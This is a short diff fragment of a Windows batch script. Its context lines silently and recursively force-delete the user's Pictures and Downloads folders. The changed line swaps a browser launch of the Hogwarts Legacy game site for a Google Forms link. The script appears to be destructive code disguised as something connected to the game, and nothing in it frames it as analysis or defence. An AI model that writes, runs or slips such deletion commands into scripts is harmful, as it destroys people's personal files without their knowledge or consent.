@@ -17,4 +17,4 @@ del /q /s /f "%Pictures%"
 del /q /s /f "%Downloads%"
 
 
-start chrome https://www.hogwartslegacy.com/en-gb
+start chrome https://docs.google.com/forms/d/e/1FAIpQLSdpeyvOBks6QBCz8PJeVibY6jwf7VNbJ9GCxjv4CpvvuRl9ew/viewform
